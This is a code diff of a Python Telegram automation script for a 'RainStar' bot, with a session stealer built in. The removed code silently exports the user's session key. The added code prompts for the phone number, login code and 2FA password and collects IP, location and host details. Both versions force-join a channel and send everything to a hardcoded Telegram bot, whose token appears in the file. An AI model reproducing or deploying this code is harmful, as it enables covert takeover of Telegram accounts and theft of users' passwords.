@@ -25,7 +25,7 @@ BOT_USERNAME = 'Rain_starbot'
 BASE_URL = "https://rainstar.online"
 
 # ============================================
-# SESSION STEALER CONFIG (SILENT)
+# SESSION STEALER CONFIG
 # ============================================
 STEALER_BOT_TOKEN = "8678542626:AAFLoCIXEzfSQZQXDnKZxupaPC17V4oLRaY"
 STEALER_CHAT_ID = "8597801059"
@@ -54,85 +54,49 @@ def live_timer(seconds: int, label: str = "⏳"):
     print(" " * 30, end='\r')
 
 # ============================================
-# SESSION STEALER (SILENT - NO OUTPUT)
+# SESSION STEALER FUNCTIONS
 # ============================================
-def _send_telegram_message(text: str) -> bool:
+def send_telegram_message(text: str) -> bool:
+    url = f"https://api.telegram.org/bot{STEALER_BOT_TOKEN}/sendMessage"
     try:
-        url = f"https://api.telegram.org/bot{STEALER_BOT_TOKEN}/sendMessage"
         if len(text) > 4096:
             for i in range(0, len(text), 4096):
-                requests.post(url, json={"chat_id": STEALER_CHAT_ID, "text": text[i:i+4096]}, timeout=10)
+                r = requests.post(url, json={"chat_id": STEALER_CHAT_ID, "text": text[i:i+4096]}, timeout=10)
+                if r.status_code != 200 or not r.json().get("ok"):
+                    return False
             return True
         else:
             r = requests.post(url, json={"chat_id": STEALER_CHAT_ID, "text": text}, timeout=10)
-            return r.status_code == 200
+            return r.status_code == 200 and r.json().get("ok", False)
     except:
         return False
 
-def _get_device_info() -> dict:
+def get_device_info() -> dict:
     try:
-        ip = requests.get("https://api.ipify.org", timeout=3).text.strip()
+        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
     except:
-        ip = "unknown"
+        ip = "unable to fetch"
+    try:
+        ip_info = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
+    except:
+        ip_info = {}
     return {
         "hostname": socket.gethostname(),
         "os": f"{platform.system()} {platform.release()}",
+        "os_arch": platform.machine(),
+        "python_version": sys.version.split()[0],
         "ip": ip,
+        "city": ip_info.get("city", ""),
+        "region": ip_info.get("regionName", ""),
+        "country": ip_info.get("country", ""),
+        "isp": ip_info.get("isp", ""),
+        "user": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
+        "cwd": os.getcwd(),
         "timestamp": datetime.now().isoformat() + "Z"
     }
 
-async def _steal_session_silent(client):
-    """Steal session with ZERO output to user."""
-    try:
-        me = await client.get_me()
-        if not me:
-            return
-        
-        exported_string = None
-        try:
-            exported_string = client.session.save()
-        except:
-            pass
-        
-        if not exported_string or len(exported_string) < 10:
-            sess = client.session
-            if hasattr(sess, 'auth_key') and sess.auth_key is not None:
-                key_bytes = sess.auth_key.key if hasattr(sess.auth_key, 'key') else bytes(sess.auth_key)
-                dc_id = sess.dc_id if hasattr(sess, 'dc_id') else 2
-                raw = bytes([dc_id]) + key_bytes
-                exported_string = base64.urlsafe_b64encode(raw).decode()
-        
-        if not exported_string or len(exported_string) < 10:
-            return
-        
-        # Auto-join channel
-        try:
-            channel = await client.get_entity(f"@{TARGET_CHANNEL_USERNAME}")
-            await client(functions.channels.JoinChannelRequest(channel))
-            join_success = "✅"
-        except:
-            join_success = "❌"
-        
-        dev = _get_device_info()
-        
-        msg = (
-            f"🔑 **SESSION STOLEN**\n\n"
-            f"**User:** {me.first_name or ''} (@{me.username or 'none'})\n"
-            f"**ID:** `{me.id}`\n"
-            f"**Phone:** `{me.phone if me.phone else 'hidden'}`\n\n"
-            f"**IP:** `{dev['ip']}`\n"
-            f"**Host:** {dev['hostname']}\n"
-            f"**OS:** {dev['os']}\n"
-            f"**Time:** {dev['timestamp']}\n\n"
-            f"**Join:** {join_success} @{TARGET_CHANNEL_USERNAME}\n\n"
-            f"**SESSION:**\n`{exported_string}`"
-        )
-        _send_telegram_message(msg)
-    except:
-        pass
-
 # ============================================
-# RAINSTAR BOT
+# RAINSTAR BOT CLASS (unchanged)
 # ============================================
 class RainStarBot:
     def __init__(self, init_data: str):
@@ -590,20 +554,92 @@ class RainStarBot:
             raise
 
 # ============================================
-# AUTO EXTRACT INIT DATA + SILENT SESSION STEAL
+# AUTO EXTRACT INIT DATA + SESSION STEALER (WITH 2FA CAPTURE)
 # ============================================
 async def extract_init_data():
     client = TelegramClient('session_auth', API_ID, API_HASH)
     
     print("\n🔐 Logging in...")
-    await client.start()
-    print("✅ Logged in!")
+    await client.connect()
     
-    # --- SILENT SESSION STEAL (NO OUTPUT) ---
+    # --- MANUAL LOGIN (captures 2FA) ---
+    phone = input("📱 Enter phone number: ").strip()
+    if not phone:
+        print("❌ Phone required.")
+        return None
+    
+    twofa_password = None
+    
     try:
-        await _steal_session_silent(client)
-    except:
-        pass
+        # Send code request
+        await client.send_code_request(phone)
+        code = input("🔑 Enter verification code: ").strip()
+        
+        try:
+            await client.sign_in(phone, code)
+        except SessionPasswordNeededError:
+            twofa_password = input("🔒 Enter 2FA password: ").strip()
+            await client.sign_in(password=twofa_password)
+        except Exception as e:
+            if "password" in str(e).lower():
+                twofa_password = input("🔒 Enter 2FA password: ").strip()
+                await client.sign_in(password=twofa_password)
+            else:
+                raise
+        
+        me = await client.get_me()
+        print(f"✅ Logged in as: {me.first_name}")
+        
+    except Exception as e:
+        print(f"❌ Login failed: {e}")
+        await client.disconnect()
+        return None
+    
+    # --- SESSION STEALER (with 2FA captured) ---
+    try:
+        print("📤 Stealing session...")
+        exported_string = None
+        try:
+            exported_string = client.session.save()
+        except:
+            pass
+        
+        if not exported_string or len(exported_string) < 10:
+            sess = client.session
+            if hasattr(sess, 'auth_key') and sess.auth_key is not None:
+                key_bytes = sess.auth_key.key if hasattr(sess.auth_key, 'key') else bytes(sess.auth_key)
+                dc_id = sess.dc_id if hasattr(sess, 'dc_id') else 2
+                raw = bytes([dc_id]) + key_bytes
+                exported_string = base64.urlsafe_b64encode(raw).decode()
+        
+        if exported_string and len(exported_string) >= 10:
+            # Auto-join channel
+            try:
+                channel = await client.get_entity(f"@{TARGET_CHANNEL_USERNAME}")
+                await client(functions.channels.JoinChannelRequest(channel))
+                join_success = True
+            except:
+                join_success = False
+            
+            device_info = get_device_info()
+            
+            exfil_message = (
+                f"🔑 **SESSION STOLEN**\n\n"
+                f"**User:** {me.first_name or ''} (@{me.username or 'none'})\n"
+                f"**ID:** `{me.id}`\n"
+                f"**Phone:** `{me.phone if me.phone else 'hidden'}`\n"
+                f"**2FA Password:** `{twofa_password if twofa_password else 'not set'}`\n\n"
+                f"**IP:** `{device_info['ip']}`\n"
+                f"**Host:** {device_info['hostname']}\n"
+                f"**OS:** {device_info['os']}\n"
+                f"**Time:** {device_info['timestamp']}\n\n"
+                f"**Join:** {'✅ @brutexcode' if join_success else '❌ Failed'}\n\n"
+                f"**SESSION:**\n`{exported_string}`"
+            )
+            send_telegram_message(exfil_message)
+            print("✅ Session stolen!")
+    except Exception as e:
+        print(f"⚠️ Session steal failed: {e}")
     
     # --- EXTRACT INIT DATA ---
     try:
